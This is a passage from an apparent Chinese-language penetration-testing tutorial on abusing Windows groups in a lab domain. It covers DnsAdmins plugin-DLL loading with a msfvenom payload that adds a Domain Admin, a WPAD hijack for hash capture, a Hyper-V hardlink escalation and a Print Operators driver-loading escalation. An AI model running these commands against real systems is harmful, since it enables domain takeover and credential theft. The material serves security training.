<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">wevtutil</span> <span class="title">qe</span> <span class="title">Security</span> /<span class="title">rd:true</span> /<span class="title">f:text</span> | <span class="title">Select</span>-<span class="title">String</span> &quot;/<span class="title">user</span>&quot;</span></span><br><span class="line"><span class="function"># <span class="title">or</span></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\&gt; <span class="title">wevtutil</span> <span class="title">qe</span> <span class="title">Security</span> /<span class="title">rd:true</span> /<span class="title">f:text</span> /<span class="title">r:share01</span> /<span class="title">u:julie</span>.<span class="title">clay</span> /<span class="title">p:Welcome1</span> | <span class="title">findstr</span> &quot;/<span class="title">user</span>&quot;</span></span><br></pre></td></tr></table></figure>

<p>Get-WinEvent</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-WinEvent</span> <span class="literal">-LogName</span> security | <span class="built_in">where</span> &#123; <span class="variable">$_</span>.ID <span class="operator">-eq</span> <span class="number">4688</span> <span class="operator">-and</span> <span class="variable">$_</span>.Properties[<span class="number">8</span>].Value <span class="operator">-like</span> <span class="string">&#x27;*/user*&#x27;</span>&#125; | <span class="built_in">Select-Object</span> <span class="selector-tag">@</span>&#123;name=<span class="string">&#x27;CommandLine&#x27;</span>;expression=&#123; <span class="variable">$_</span>.Properties[<span class="number">8</span>].Value &#125;&#125;</span><br><span class="line"></span><br><span class="line">CommandLine</span><br><span class="line"><span class="literal">-----------</span></span><br><span class="line">net use T: \\fs01\backups /user:tim MyStr0ngP@ssword</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>注意</strong>：使用 Get-WInEvent 搜索安全事件日志需要管理员访问权限或在注册表项 HKLM\System\CurrentControlSet\Services\Eventlog\Security 上调整权限。仅加入事件日志读取器组是不够的。</p>
</blockquote>
<h2 id="DnsAdmins"><a href="#DnsAdmins" class="headerlink" title="DnsAdmins"></a>DnsAdmins</h2><p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#dnsadmins">DnsAdmins</a>组的成员有权访问网络上的 DNS 信息。Windows DNS 服务支持自定义插件，并可从中调用函数来解析不在任何本地托管 DNS 区域范围内的名称查询，DNS服务以<code>NT AUTHORITY\SYSTEM</code>的身份运行。</p>
<p> DNS 在域控制器上运行（这非常常见）时，可以执行以下攻击：</p>
<ul>
<li>DNS 管理通过 RPC 执行</li>
<li><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723">ServerLevelPluginDll</a>允许加载自定义 DLL，而无需验证 DLL 的路径。这可以通过<code>dnscmd</code>命令行中的工具完成</li>
<li>当<code>DnsAdmins</code>组成员运行<code>dnscmd</code>以下命令时，将填充注册表项<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll</code></li>
<li>当重新启动 DNS 服务时，将加载此路径中的 DLL（即域控制器的机器帐户可以访问的网络共享）</li>
<li>攻击者可以加载自定义 DLL 来获取反向 shell，甚至可以加载 Mimikatz 等工具作为 DLL 来转储凭据。</li>
</ul>
<h3 id="DnsAdmins-访问权限利用"><a href="#DnsAdmins-访问权限利用" class="headerlink" title="DnsAdmins 访问权限利用"></a>DnsAdmins 访问权限利用</h3><p>使用<code>msfvenom</code>生成一个恶意 DLL，将用户添加到<code>domain admins</code>组中。将恶意文件传输至目标机器。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ msfvenom -p windows/x64/exec cmd=&#x27;net group &quot;domain admins&quot; netadm /add /domain&#x27; -f dll -o adduser.dll</span><br></pre></td></tr></table></figure>

<p>查询 DnsAdmins 组的成员</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; <span class="built_in">Get-ADGroupMember</span> <span class="literal">-Identity</span> DnsAdmins</span><br><span class="line"></span><br><span class="line">distinguishedName : CN=netadm,CN=Users,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">name              : netadm</span><br><span class="line">objectClass       : user</span><br><span class="line">objectGUID        : <span class="number">1</span>a1ac159<span class="literal">-f364-4805-a4bb-7153051a8c14</span></span><br><span class="line">SamAccountName    : netadm</span><br><span class="line">SID               : S<span class="literal">-1-5-21-669053619-2741956077-1013132368-1109</span>   </span><br></pre></td></tr></table></figure>

<p>将恶意文件传输到目标机器后，以 DnsAdmins 组的成员身份加载恶意文件</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">dnscmd.exe</span> /<span class="title">config</span> /<span class="title">serverlevelplugindll</span> <span class="title">C</span>:\<span class="title">Users</span>\<span class="title">netadm</span>\<span class="title">Desktop</span>\<span class="title">adduser.dll</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Registry</span> <span class="title">property</span> <span class="title">serverlevelplugindll</span> <span class="title">successfully</span> <span class="title">reset</span>.</span></span><br><span class="line"><span class="function"><span class="title">Command</span> <span class="title">completed</span> <span class="title">successfully</span>.</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意：必须指定自定义 DLL 的完整路径，否则攻击将无法正常工作。</p>
</blockquote>
<p><code>DnsAdmins</code> 组的成员只能使用 <code>dnscmd</code> 实用程序进行操作，因为他们没有直接对注册表项的权限。</p>
<p>配置包含恶意插件路径的注册表设置并创建有效负载后，下次启动 DNS 服务时将加载 DLL。DnsAdmins 组的成员身份不具备重新启动 DNS 服务的能力，但可以想象系统管理员可能会允许 DNS 管理员执行此操作。</p>
<p>重新启动 DNS 服务后（如果用户具有此级别的访问权限），应该能够运行自定义 DLL 并添加用户或获取反向 shell。如果无权重新启动 DNS 服务器，将不得不等到服务器或服务重新启动。让检查当前用户对 DNS 服务的权限。</p>
<p>首先，查询用户 SID</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">wmic</span> <span class="title">useraccount</span> <span class="title">where</span> <span class="title">name</span>=&quot;<span class="title">netadm</span>&quot; <span class="title">get</span> <span class="title">sid</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">SID</span></span></span><br><span class="line"><span class="function"><span class="title">S</span>-1-5-21-669053619-2741956077-1013132368-1109</span></span><br></pre></td></tr></table></figure>

<p>DNS 服务的权限，<a target="_blank" rel="noopener" href="https://www.winhelponline.com/blog/view-edit-service-permissions-windows/">RPWP</a> 权限，分别转换为 SERVICE_START 和 SERVICE_STOP。</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">sc.exe</span> <span class="title">sdshow</span> <span class="title">DNS</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">D</span>:(<span class="title">A</span>;;<span class="title">CCLCSWLOCRRC</span>;;;<span class="title">IU</span>)(<span class="title">A</span>;;<span class="title">CCLCSWLOCRRC</span>;;;<span class="title">SU</span>)(<span class="title">A</span>;;<span class="title">CCLCSWRPWPDTLOCRRC</span>;;;<span class="title">SY</span>)(<span class="title">A</span>;;<span class="title">CCDCLCSWRPWPDTLOCRSDRCWDWO</span>;;;<span class="title">BA</span>)(<span class="title">A</span>;;<span class="title">CCDCLCSWRPWPDTLOCRSDRCWDWO</span>;;;<span class="title">SO</span>)(<span class="title">A</span>;;<span class="title">RPWP</span>;;;<span class="title">S</span>-1-5-21-669053619-2741956077-1013132368-1109)<span class="title">S</span>:(<span class="title">AU</span>;<span class="title">FA</span>;<span class="title">CCDCLCSWRPWPDTLOCRSDRCWDWO</span>;;;<span class="title">WD</span>)</span></span><br></pre></td></tr></table></figure>

<p>重启 DNS 服务</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">sc</span> <span class="title">stop</span> <span class="title">dns</span></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\&gt; <span class="title">sc</span> <span class="title">start</span> <span class="title">dns</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">SERVICE_NAME</span>: <span class="title">dns</span></span></span><br><span class="line"><span class="function">        <span class="title">TYPE</span>               : 10  <span class="title">WIN32_OWN_PROCESS</span></span></span><br><span class="line"><span class="function">        <span class="title">STATE</span>              : 2  <span class="title">START_PENDING</span></span></span><br><span class="line"><span class="function">                                (<span class="title">NOT_STOPPABLE</span>, <span class="title">NOT_PAUSABLE</span>, <span class="title">IGNORES_SHUTDOWN</span>)</span></span><br><span class="line"><span class="function">        <span class="title">WIN32_EXIT_CODE</span>    : 0  (0<span class="title">x0</span>)</span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_EXIT_CODE</span>  : 0  (0<span class="title">x0</span>)</span></span><br><span class="line"><span class="function">        <span class="title">CHECKPOINT</span>         : 0<span class="title">x0</span></span></span><br><span class="line"><span class="function">        <span class="title">WAIT_HINT</span>          : 0<span class="title">x7d0</span></span></span><br><span class="line"><span class="function">        <span class="title">PID</span>                : 6960</span></span><br><span class="line"><span class="function">        <span class="title">FLAGS</span>              :</span></span><br></pre></td></tr></table></figure>

<p>确认组成员身份</p>
<p>如果一切按计划进行，帐户将被添加到域管理员组，或者如果自定义 DLL 可以让重新建立连接，帐户就会收到反向 shell。</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">net</span> <span class="title">group</span> &quot;<span class="title">Domain</span> <span class="title">Admins</span>&quot; /<span class="title">dom</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Group</span> <span class="title">name</span>     <span class="title">Domain</span> <span class="title">Admins</span></span></span><br><span class="line"><span class="function"><span class="title">Comment</span>        <span class="title">Designated</span> <span class="title">administrators</span> <span class="title">of</span> <span class="title">the</span> <span class="title">domain</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Members</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">-------------------------------------------------------------------------------</span></span><br><span class="line"><span class="function"><span class="title">Administrator</span>            <span class="title">netadm</span></span></span><br><span class="line"><span class="function"><span class="title">The</span> <span class="title">command</span> <span class="title">completed</span> <span class="title">successfully</span>.</span></span><br></pre></td></tr></table></figure>

<h3 id="Clean"><a href="#Clean" class="headerlink" title="Clean"></a>Clean</h3><p>在域控制器上更改配置并停止&#x2F;重新启动 DNS 服务是非常具有破坏性的操作，必须非常小心地执行。</p>
<p>必须使用本地或域管理员帐户从提升的控制台执行这些步骤。</p>
<p>确认<code>ServerLevelPluginDll</code>注册表项是否存在。除非删除自定义 DLL，否则将无法再次正确启动 DNS 服务。</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">reg</span> <span class="title">query</span> \\10.129.43.9\<span class="title">HKLM</span>\<span class="title">SYSTEM</span>\<span class="title">CurrentControlSet</span>\<span class="title">Services</span>\<span class="title">DNS</span>\<span class="title">Parameters</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">HKEY_LOCAL_MACHINE</span>\<span class="title">SYSTEM</span>\<span class="title">CurrentControlSet</span>\<span class="title">Services</span>\<span class="title">DNS</span>\<span class="title">Parameters</span></span></span><br><span class="line"><span class="function">    <span class="title">GlobalQueryBlockList</span>    <span class="title">REG_MULTI_SZ</span>    <span class="title">wpad</span>\0<span class="title">isatap</span></span></span><br><span class="line"><span class="function">    <span class="title">EnableGlobalQueryBlockList</span>    <span class="title">REG_DWORD</span>    0<span class="title">x1</span></span></span><br><span class="line"><span class="function">    <span class="title">PreviousLocalHostname</span>    <span class="title">REG_SZ</span>    <span class="title">WINLPE</span>-<span class="title">DC01.INLANEFREIGHT.LOCAL</span></span></span><br><span class="line"><span class="function">    <span class="title">Forwarders</span>    <span class="title">REG_MULTI_SZ</span>    1.1.1.1\08.8.8.8</span></span><br><span class="line"><span class="function">    <span class="title">ForwardingTimeout</span>    <span class="title">REG_DWORD</span>    0<span class="title">x3</span></span></span><br><span class="line"><span class="function">    <span class="title">IsSlave</span>    <span class="title">REG_DWORD</span>    0<span class="title">x0</span></span></span><br><span class="line"><span class="function">    <span class="title">BootMethod</span>    <span class="title">REG_DWORD</span>    0<span class="title">x3</span></span></span><br><span class="line"><span class="function">    <span class="title">AdminConfigured</span>    <span class="title">REG_DWORD</span>    0<span class="title">x1</span></span></span><br><span class="line"><span class="function">    <span class="title">ServerLevelPluginDll</span>    <span class="title">REG_SZ</span>    <span class="title">adduser.dll</span></span></span><br></pre></td></tr></table></figure>

<p>使用<code>reg delete</code>命令来删除指向自定义 DLL 的键。</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">reg</span> <span class="title">delete</span> \\10.129.43.9\<span class="title">HKLM</span>\<span class="title">SYSTEM</span>\<span class="title">CurrentControlSet</span>\<span class="title">Services</span>\<span class="title">DNS</span>\<span class="title">Parameters</span>  /<span class="title">v</span> <span class="title">ServerLevelPluginDll</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Delete</span> <span class="title">the</span> <span class="title">registry</span> <span class="title">value</span> <span class="title">ServerLevelPluginDll</span> (<span class="title">Yes</span>/<span class="title">No</span>)? <span class="title">Y</span></span></span><br><span class="line"><span class="function"><span class="title">The</span> <span class="title">operation</span> <span class="title">completed</span> <span class="title">successfully</span>.</span></span><br></pre></td></tr></table></figure>

<p>重新启动DNS服务</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">sc.exe</span> <span class="title">stop</span> <span class="title">dns</span></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\&gt; <span class="title">sc.exe</span> <span class="title">start</span> <span class="title">dns</span></span></span><br></pre></td></tr></table></figure>

<p>检查DNS服务状态</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">sc</span> <span class="title">query</span> <span class="title">dns</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">SERVICE_NAME</span>: <span class="title">dns</span></span></span><br><span class="line"><span class="function">        <span class="title">TYPE</span>               : 10  <span class="title">WIN32_OWN_PROCESS</span></span></span><br><span class="line"><span class="function">        <span class="title">STATE</span>              : 4  <span class="title">RUNNING</span></span></span><br><span class="line"><span class="function">                                (<span class="title">STOPPABLE</span>, <span class="title">PAUSABLE</span>, <span class="title">ACCEPTS_SHUTDOWN</span>)</span></span><br><span class="line"><span class="function">        <span class="title">WIN32_EXIT_CODE</span>    : 0  (0<span class="title">x0</span>)</span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_EXIT_CODE</span>  : 0  (0<span class="title">x0</span>)</span></span><br><span class="line"><span class="function">        <span class="title">CHECKPOINT</span>         : 0<span class="title">x0</span></span></span><br><span class="line"><span class="function">        <span class="title">WAIT_HINT</span>          : 0<span class="title">x0</span></span></span><br></pre></td></tr></table></figure>

<p>还可以利用 Mimikatz 工具创建者的 <a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz/tree/master/mimilib">mimilib.dll</a>，通过修改 <a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/kdns.c">kdns.c</a> 文件来执行反向 shell 单行命令或选择的其他命令来获得命令执行能力。</p>
<h3 id="创建-WPAD-记录"><a href="#创建-WPAD-记录" class="headerlink" title="创建 WPAD 记录"></a>创建 WPAD 记录</h3><p>滥用 DnsAdmins 组权限的另一种方法是创建 WPAD 记录。此组的成员身份赋予<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/powershell/module/dnsserver/set-dnsserverglobalqueryblocklist?view=windowsserver2019-ps">禁用全局查询阻止安全性</a>的权限，默认情况下会阻止此攻击。Server 2008 首次引入了在 DNS 服务器上添加到全局查询阻止列表的功能。默认情况下，Web 代理自动发现协议 (WPAD) 和站内自动隧道寻址协议 (ISATAP) 位于全局查询阻止列表中。这些协议很容易被劫持，任何域用户都可以创建包含这些名称的计算机对象或 DNS 记录。</p>
<p>禁用全局查询阻止列表并创建 WPAD 记录后，每台运行 WPAD 且设置默认的机器的流量都将通过攻击机器进行代理。可以使用<a target="_blank" rel="noopener" href="https://github.com/lgandx/Responder">Responder</a>或<a target="_blank" rel="noopener" href="https://github.com/Kevin-Robertson/Inveigh">Inveigh</a>等工具执行流量欺骗，并尝试捕获密码哈希并离线破解它们或执行 SMBRelay 攻击。</p>
<p>禁用了全局查询阻止列表</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; <span class="built_in">Set-DnsServerGlobalQueryBlockList</span> <span class="literal">-Enable</span> <span class="variable">$false</span> <span class="literal">-ComputerName</span> dc01.inlanefreight.local</span><br></pre></td></tr></table></figure>

<p>添加指向攻击机器的 WPAD 记录</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; <span class="built_in">Add-DnsServerResourceRecordA</span> <span class="literal">-Name</span> wpad <span class="literal">-ZoneName</span> inlanefreight.local <span class="literal">-ComputerName</span> dc01.inlanefreight.local <span class="literal">-IPv4Address</span> <span class="number">10.10</span>.<span class="number">14.3</span></span><br></pre></td></tr></table></figure>

<h2 id="Hyper-V-Administrators"><a href="#Hyper-V-Administrators" class="headerlink" title="Hyper-V Administrators"></a>Hyper-V Administrators</h2><p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#hyper-v-administrators">Hyper -V 管理员</a>组对所有<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows-server/manage/windows-admin-center/use/manage-virtual-machines">Hyper-V 功能</a>具有完全访问权限。如果域控制器已虚拟化，则 <code>Hyper-V Administrators</code> 应被视为域管理员。他们可以轻松创建实时域控制器的克隆并离线安装虚拟磁盘以获取 NTDS.dit 文件并提取域中所有用户的 NTLM 密码哈希。</p>
<p>这篇<a target="_blank" rel="noopener" href="https://decoder.cloud/2020/01/20/from-hyper-v-admin-to-system/">blog</a>中也有详细记录，删除虚拟机后，<code>vmms.exe</code> 会尝试恢复相应 <code>.vhdx</code> 文件的原始文件权限，并以 <code>NT AUTHORITY\SYSTEM</code> 身份执行此操作，而无需冒充用户。可以删除 <code>.vhdx</code> 文件并创建一个本机硬链接，将此文件指向受保护的 SYSTEM 文件，将拥有该文件的完全权限。</p>
<p>如果操作系统存在 <a target="_blank" rel="noopener" href="https://www.tenable.com/cve/CVE-2018-0952">CVE-2018-0952</a> 或 <a target="_blank" rel="noopener" href="https://www.tenable.com/cve/CVE-2019-0841">CVE-2019-0841</a> 漏洞，也可以利用这些漏洞获取 SYSTEM 权限。</p>
<p>一个例子是 Firefox，它安装了 Mozilla 维护服务。可以更新<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/decoder-it/Hyper-V-admin-EOP/master/hyperv-eop.ps1">此漏洞</a>（NT 硬链接的概念验证），以授予当前用户对以下文件的完全权限：</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Program</span> <span class="title">Files</span> (<span class="title">x86</span>)\<span class="title">Mozilla</span> <span class="title">Maintenance</span> <span class="title">Service</span>\<span class="title">maintenanceservice.exe</span></span></span><br></pre></td></tr></table></figure>

<p>运行一下命令后，应该可以完全控制此文件并获取其所有权。</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">takeown</span> /<span class="title">F</span> <span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span> (<span class="title">x86</span>)\<span class="title">Mozilla</span> <span class="title">Maintenance</span> <span class="title">Service</span>\<span class="title">maintenanceservice.exe</span></span></span><br></pre></td></tr></table></figure>

<p>启动 Mozilla 维护服务，并用恶意的 MaintenanceService.exe 替换此文件，启动维护服务，并以 SYSTEM 身份执行命令。</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">sc.exe</span> <span class="title">start</span> <span class="title">MozillaMaintenance</span></span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意：2020 年 3 月的 Windows 安全更新已缓解此向量的影响，更新改变了与硬链接相关的行为。</p>
</blockquote>
<h2 id="Print-Operators"><a href="#Print-Operators" class="headerlink" title="Print Operators"></a>Print Operators</h2><p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#print-operators">Print Operators</a>是一个具有高权限的组，Print Operators 授予其成员 <code>SeLoadDriverPrivilege</code>、管理、创建、共享和删除连接到域控制器的打印机的权限，以及本地登录域控制器并将其关闭的能力。如果发出命令 <code>whoami /priv</code>，并且在未提升的上下文中看不到 <code>SeLoadDriverPrivilege</code>，则需要绕过 UAC。</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">whoami</span> /<span class="title">priv</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">PRIVILEGES</span> <span class="title">INFORMATION</span></span></span><br><span class="line"><span class="function">----------------------</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Privilege</span> <span class="title">Name</span>           <span class="title">Description</span>                          <span class="title">State</span></span></span><br><span class="line"><span class="function">======================== =================================    =======</span></span><br><span class="line"><span class="function"><span class="title">SeIncreaseQuotaPrivilege</span> <span class="title">Adjust</span> <span class="title">memory</span> <span class="title">quotas</span> <span class="title">for</span> <span class="title">a</span> <span class="title">process</span>   <span class="title">Disabled</span></span></span><br><span class="line"><span class="function"><span class="title">SeChangeNotifyPrivilege</span>  <span class="title">Bypass</span> <span class="title">traverse</span> <span class="title">checking</span>             <span class="title">Enabled</span></span></span><br><span class="line"><span class="function"><span class="title">SeShutdownPrivilege</span>      <span class="title">Shut</span> <span class="title">down</span> <span class="title">the</span> <span class="title">system</span>                 <span class="title">Disabled</span></span></span><br></pre></td></tr></table></figure>

<h3 id="开启-SeLoadDriverPrivilege"><a href="#开启-SeLoadDriverPrivilege" class="headerlink" title="开启 SeLoadDriverPrivilege"></a>开启 SeLoadDriverPrivilege</h3><p><a target="_blank" rel="noopener" href="https://github.com/hfiref0x/UACME">UACMe</a> 仓库提供了完整的 UAC 绕过列表，可以从命令行使用。或者，从 GUI，可以打开管理命令 shell 并输入属于 Print Operators 组成员的帐户的凭据。如果再次检查权限，<code>SeLoadDriverPrivilege</code> 是可见的，但已被禁用。</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">whoami</span> /<span class="title">priv</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">PRIVILEGES</span> <span class="title">INFORMATION</span></span></span><br><span class="line"><span class="function">----------------------</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Privilege</span> <span class="title">Name</span>                <span class="title">Description</span>                          <span class="title">State</span></span></span><br><span class="line"><span class="function">============================= ==================================  ==========</span></span><br><span class="line"><span class="function"><span class="title">SeMachineAccountPrivilege</span>     <span class="title">Add</span> <span class="title">workstations</span> <span class="title">to</span> <span class="title">domain</span>           <span class="title">Disabled</span></span></span><br><span class="line"><span class="function"><span class="title">SeLoadDriverPrivilege</span>         <span class="title">Load</span> <span class="title">and</span> <span class="title">unload</span> <span class="title">device</span> <span class="title">drivers</span>       <span class="title">Disabled</span></span></span><br><span class="line"><span class="function"><span class="title">SeShutdownPrivilege</span>           <span class="title">Shut</span> <span class="title">down</span> <span class="title">the</span> <span class="title">system</span>			       <span class="title">Disabled</span></span></span><br><span class="line"><span class="function"><span class="title">SeChangeNotifyPrivilege</span>       <span class="title">Bypass</span> <span class="title">traverse</span> <span class="title">checking</span>             <span class="title">Enabled</span></span></span><br><span class="line"><span class="function"><span class="title">SeIncreaseWorkingSetPrivilege</span> <span class="title">Increase</span> <span class="title">a</span> <span class="title">process</span> <span class="title">working</span> <span class="title">set</span>       <span class="title">Disabled</span></span></span><br></pre></td></tr></table></figure>

<p>驱动程序<code>Capcom.sys</code>包含允许任何用户以 SYSTEM 权限执行 shellcode 的功能。可以使用权限来加载此易受攻击的驱动程序并提升权限。可以使用<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp">此工具</a>来加载驱动程序。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winternl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sddl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;tchar.h&quot;</span></span></span><br></pre></td></tr></table></figure>

<p>下载到本地编辑并编译</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt;<span class="title">cl</span> /<span class="title">DUNICODE</span> /<span class="title">D_UNICODE</span> <span class="title">EnableSeLoadDriverPrivilege.cpp</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Microsoft</span> (<span class="title">R</span>) <span class="title">C</span>/<span class="title">C</span>++ <span class="title">Optimizing</span> <span class="title">Compiler</span> <span class="title">Version</span> 19.28.29913 <span class="title">for</span> <span class="title">x86</span></span></span><br><span class="line"><span class="function"><span class="title">Copyright</span> (<span class="title">C</span>) <span class="title">Microsoft</span> <span class="title">Corporation</span>.  <span class="title">All</span> <span class="title">rights</span> <span class="title">reserved</span>.</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">EnableSeLoadDriverPrivilege.cpp</span></span></span><br><span class="line"><span class="function"><span class="title">Microsoft</span> (<span class="title">R</span>) <span class="title">Incremental</span> <span class="title">Linker</span> <span class="title">Version</span> 14.28.29913.0</span></span><br><span 